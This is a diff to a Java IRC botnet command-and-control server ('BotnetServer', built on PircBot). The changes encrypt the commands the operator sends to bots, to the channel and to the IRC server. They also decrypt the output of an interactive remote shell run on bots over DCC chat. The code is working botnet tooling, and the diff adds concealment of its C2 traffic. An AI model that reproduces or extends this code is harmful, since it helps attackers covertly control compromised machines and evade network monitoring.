@@ -110,6 +110,7 @@ public class BotnetServer extends PircBot {
 		}
 	}
 	
+	// TODO: put this into the MsgEncrypt object as a static method
 	protected Key genCCBotKey() throws Exception {
 		AlgorithmParameterGenerator paramGen = AlgorithmParameterGenerator.getInstance("DH");
 		paramGen.init(1024);
@@ -170,9 +171,13 @@ public class BotnetServer extends PircBot {
 		System.out.print("Command: ");
 		String message = input.nextLine();
 		while(!message.toLowerCase().equalsIgnoreCase("q")) {
+			try {
 			performCommand(message);
 			System.out.print("Command: ");
 			message = input.nextLine();
+			} catch (Exception e) {
+				System.out.println("Can't perform command on the message");
+			}
 		}
 	}
 	
@@ -184,7 +189,7 @@ public class BotnetServer extends PircBot {
 	 * 
 	 * @param s A command/message to be interpreted
 	 */
-	public void performCommand(String s) {
+	public void performCommand(String s) throws Exception {
 		//Respond to a help command with a shit ton of printlns.
 		if (s.toLowerCase().equalsIgnoreCase("help")) {
 			printHelp();
@@ -220,7 +225,9 @@ public class BotnetServer extends PircBot {
 				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
 				for (int i = 0; i < botNames.length; i++) {
 					if (!botNames[i].equals(NAME)) {
-						this.sendMessage(botNames[i], command);
+						// TODO: encrypt command
+						//this.sendMessage(botNames[i], command);
+						this.sendMessage(botNames[i], masterMsgE.encryptMsg(command));
 					}
 				}
 			}
@@ -254,15 +261,21 @@ public class BotnetServer extends PircBot {
 					command += parts[i];
 				}
 				for (int i = 0; i < bots.length; i++) {
-					sendMessage(bots[i], command);
+					// TODO: encrypt command
+					//sendMessage(bots[i], command);
+					sendMessage(bots[i], masterMsgE.encryptMsg(command));
 				}
 			}
 		//Respond to a message beginning with a colon by messaging the CHANNEL
 		} else if (s.startsWith(":")) {
-			sendMessage(CHANNEL, s.substring(1));
+			// TODO: encrypt s.substring
+			//sendMessage(CHANNEL, s.substring(1));
+			sendMessage(CHANNEL, masterMsgE.encryptMsg(s.substring(1)));
 		//Respond to all other messages by sending the message raw to the IRC server
 		} else if (!s.isEmpty()) {
-			sendRawLine(s);
+			// TODO: encrypt s
+			//sendRawLine(s);
+			sendRawLine(masterMsgE.encryptMsg(s));
 		}
 	}
 	
@@ -342,17 +355,23 @@ public class BotnetServer extends PircBot {
 			Scanner shellout = new Scanner(chat.getBufferedReader());
 			
 			try {
-				System.out.print(shellout.nextLine());
+				// TODO: decrypt this
+				//System.out.print(shellout.nextLine());
+				System.out.println(masterMsgE.decryptMsg(shellout.nextLine()));
 				
 				String command = input.nextLine();
 				while (!command.equalsIgnoreCase(TERMINATION)) {
 					// TODO: make this encrypted
 					chat.sendLine(masterMsgE.encryptMsg(command)); // Made this encrypted
 					//chat.sendLine(command);
-					String response = shellout.nextLine();
+					// TODO: decrypt this
+					//String response = shellout.nextLine();
+					String response = masterMsgE.decryptMsg(shellout.nextLine());
 					while (!response.endsWith(SENTINEL)) {
 						System.out.println("\t" + response);
-						response = shellout.nextLine();
+						// TODO: decrypt this
+						//response = shellout.nextLine();
+						response = masterMsgE.decryptMsg(shellout.nextLine());
 					}
 					System.out.print(response);
 					command = input.nextLine();
